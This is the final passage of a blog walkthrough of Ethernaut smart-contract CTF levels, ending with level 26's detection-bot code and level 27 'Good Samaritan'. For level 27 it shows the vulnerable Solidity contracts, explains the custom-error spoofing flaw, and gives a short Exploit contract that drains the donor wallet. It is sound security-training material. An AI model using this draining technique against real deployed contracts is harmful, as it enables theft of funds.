 | bytes4  | 0x9cd1a121                                                         |</span></span><br><span class="line"><span class="comment">| 0x68            | 32     | to                                     | address | 0x000000000000000000000000XxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx |</span></span><br><span class="line"><span class="comment">| 0x88            | 32     | value                                  | uint256 | 0x0000000000000000000000000000000000000000000000056bc75e2d63100000 |</span></span><br><span class="line"><span class="comment">| 0xA8            | 32     | origSender                             | address | 0x000000000000000000000000XxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXxXx |</span></span><br><span class="line"><span class="comment">| 0xC8            | 28     | padding                                | bytes   | 0x00000000000000000000000000000000000000000000000000000000         |</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">handleTransaction</span>(<span class="params"></span></span><br><span class="line"><span class="params">    address user,</span></span><br><span class="line"><span class="params">    bytes calldata <span class="comment">/* msgData */</span></span></span><br><span class="line"><span class="params">  </span>) external override &#123;</span><br><span class="line">    address to;</span><br><span class="line">    uint256 value;</span><br><span class="line">    address origSender;</span><br><span class="line">    <span class="comment">// decode msgData params</span></span><br><span class="line">    assembly &#123;</span><br><span class="line">      to := <span class="title function_">calldataload</span>(<span class="number">0x68</span>)</span><br><span class="line">      value := <span class="title function_">calldataload</span>(<span class="number">0x88</span>)</span><br><span class="line">      origSender := <span class="title function_">calldataload</span>(<span class="number">0xa8</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (origSender == vault) &#123;</span><br><span class="line">      <span class="title class_">Forta</span>(msg.<span class="property">sender</span>).<span class="title function_">raiseAlert</span>(user);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="27-Good-Samaritan"><a href="#27-Good-Samaritan" class="headerlink" title="27 - Good Samaritan"></a>27 - Good Samaritan</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity &gt;=<span class="number">0.8</span><span class="number">.0</span> &lt;<span class="number">0.9</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;openzeppelin-contracts-08/utils/Address.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">GoodSamaritan</span> &#123;</span><br><span class="line">    <span class="title class_">Wallet</span> public wallet;</span><br><span class="line">    <span class="title class_">Coin</span> public coin;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        wallet = <span class="keyword">new</span> <span class="title class_">Wallet</span>();</span><br><span class="line">        coin = <span class="keyword">new</span> <span class="title class_">Coin</span>(<span class="title function_">address</span>(wallet));</span><br><span class="line"></span><br><span class="line">        wallet.<span class="title function_">setCoin</span>(coin);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">requestDonation</span>(<span class="params"></span>) external <span class="title function_">returns</span>(<span class="params">bool enoughBalance</span>)&#123;</span><br><span class="line">        <span class="comment">// donate 10 coins to requester</span></span><br><span class="line">        <span class="keyword">try</span> wallet.<span class="title function_">donate10</span>(<span class="params">msg.sender</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (bytes memory err) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_">keccak256</span>(abi.<span class="title function_">encodeWithSignature</span>(<span class="string">&quot;NotEnoughBalance()&quot;</span>)) == <span class="title function_">keccak256</span>(err)) &#123;</span><br><span class="line">                <span class="comment">// send the coins left</span></span><br><span class="line">                wallet.<span class="title function_">transferRemainder</span>(msg.<span class="property">sender</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Coin</span> &#123;</span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balances;</span><br><span class="line"></span><br><span class="line">    error <span class="title class_">InsufficientBalance</span>(uint256 current, uint256 required);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address wallet_</span>) &#123;</span><br><span class="line">        <span class="comment">// one million coins for Good Samaritan initially</span></span><br><span class="line">        balances[wallet_] = <span class="number">10</span>**<span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address dest_, uint256 amount_</span>) external &#123;</span><br><span class="line">        uint256 currentBalance = balances[msg.<span class="property">sender</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// transfer only occurs if balance is enough</span></span><br><span class="line">        <span class="keyword">if</span>(amount_ &lt;= currentBalance) &#123;</span><br><span class="line">            balances[msg.<span class="property">sender</span>] -= amount_;</span><br><span class="line">            balances[dest_] += amount_;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(dest_.<span class="title function_">isContract</span>()) &#123;</span><br><span class="line">                <span class="comment">// notify contract </span></span><br><span class="line">                <span class="title class_">INotifyable</span>(dest_).<span class="title function_">notify</span>(amount_);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            revert <span class="title class_">InsufficientBalance</span>(currentBalance, amount_);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Wallet</span> &#123;</span><br><span class="line">    <span class="comment">// The owner of the wallet instance</span></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Coin</span> public coin;</span><br><span class="line"></span><br><span class="line">    error <span class="title class_">OnlyOwner</span>();</span><br><span class="line">    error <span class="title class_">NotEnoughBalance</span>();</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">onlyOwner</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(msg.<span class="property">sender</span> != owner) &#123;</span><br><span class="line">            revert <span class="title class_">OnlyOwner</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">donate10</span>(<span class="params">address dest_</span>) external onlyOwner &#123;</span><br><span class="line">        <span class="comment">// check balance left</span></span><br><span class="line">        <span class="keyword">if</span> (coin.<span class="title function_">balances</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)) &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            revert <span class="title class_">NotEnoughBalance</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// donate 10 coins</span></span><br><span class="line">            coin.<span class="title function_">transfer</span>(dest_, <span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transferRemainder</span>(<span class="params">address dest_</span>) external onlyOwner &#123;</span><br><span class="line">        <span class="comment">// transfer balance left</span></span><br><span class="line">        coin.<span class="title function_">transfer</span>(dest_, coin.<span class="title function_">balances</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setCoin</span>(<span class="params">Coin coin_</span>) external onlyOwner &#123;</span><br><span class="line">        coin = coin_;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">INotifyable</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">notify</span>(<span class="params">uint256 amount</span>) external;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>We need to drain all the funds to complete this challenge. If we look at the <code>wallet</code> contract, it has a <code>donate10</code> function, which checks if the balance of it is less than <code>10</code> and if yes, it returns a <code>NotEnoughBalance()</code> error, else it transfers <code>10</code> coins to the given address. However, since the <code>NotEnoughBalance()</code> custom error is used only once and under the condition that the balance is less than <code>10</code>, the <code>GoodSmaritan</code> contract sends the remaining amount to the address using the wallet’s <code>transferRemainder</code> function assuming the transaction amount is always less than <code>10</code>. However, the <code>Coin</code> contract does call a function called <code>notify()</code> if the given address is a contract after the transaction is successful, so if it sends the same custom error <code>NotEnoughBalance()</code>, then it does trigger the check inside the <code>GoodSmaritan</code> contract making it to call <code>transferRemainder</code> function eventually sending all of it’s funds to the given contract.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity &gt;=<span class="number">0.8</span><span class="number">.0</span> &lt;<span class="number">0.9</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface <span class="title class_">GoodSamaritan</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">requestDonation</span>(<span class="params"></span>) external <span class="title function_">returns</span>(bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface <span class="title class_">INotifyable</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">notify</span>(<span class="params">uint256 amount</span>) external;</span><br><span class="line">&#125;</span><br><span class="line">contract <span class="title class_">Exploit</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="title class_">GoodSamaritan</span> gs;</span><br><span class="line">    error <span class="title class_">NotEnoughBalance</span>();</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _address</span>)&#123;</span><br><span class="line">        gs = <span class="title class_">GoodSamaritan</span>(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) external &#123;</span><br><span class="line">        gs.<span class="title function_">requestDonation</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">notify</span>(<span class="params">uint256 amount</span>) external&#123;</span><br><span class="line">        <span class="keyword">if</span> (amount==<span class="number">10</span>)&#123;revert <span class="title class_">NotEnoughBalance</span>();&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/images/resume.pdf">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">tags</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#19-Alien-Codex"><span class="toc-number">1.</span> <span class="toc-text">19 - Alien Codex</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#20-Denial"><span class="toc-number">2.</span> <span class="toc-text">20 - Denial</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#21-Shop"><span class="toc-number">3.</span> <span class="toc-text">21 - Shop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22-Dex"><span class="toc-number">4.</span> <span class="toc-text">22 - Dex</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#23-Dex-Two"><span class="toc-number">5.</span> <span class="toc-text">23 - Dex Two</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#24-Puzzle-Wallet"><span class="toc-number">6.</span> <span class="toc-text">24 - Puzzle Wallet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#25-Motorbike"><span class="toc-number">7.</span> <span class="toc-text">25 - Motorbike</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#26-DoubleEntryPoint"><span class="toc-number">8.</span> <span class="toc-text">26 - DoubleEntryPoint</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#27-Good-Samaritan"><span class="toc-number">9.</span> <span class="toc-text">27 - Good Samaritan</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/11/17/19-27-Ethernaut-CTF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/11/17/19-27-Ethernaut-CTF/&text=19-27 Ethernaut CTF"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/11/17/19-27-Ethernaut-CTF/&title=19-27 Ethernaut CTF"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/11/17/19-27-Ethernaut-CTF/&is_video=false&description=19-27 Ethernaut CTF"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=19-27 Ethernaut CTF&body=Check out this article: http://example.com/2022/11/17/19-27-Ethernaut-CTF/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/11/17/19-27-Ethernaut-CTF/&title=19-27 Ethernaut CTF"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/11/17/19-27-Ethernaut-CTF/&title=19-27 Ethernaut CTF"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/11/17/19-27-Ethernaut-CTF/&title=19-27 Ethernaut CTF"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/11/17/19-27-Ethernaut-CTF/&title=19-27 Ethernaut CTF"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/11/17/19-27-Ethernaut-CTF/&name=19-27 Ethernaut CTF&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/11/17/19-27-Ethernaut-CTF/&t=19-27 Ethernaut CTF"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2019-2023
    Chandu Kona
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/images/resume.pdf">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=G-4V3049N925"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'G-4V3049N925');
    </script>

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
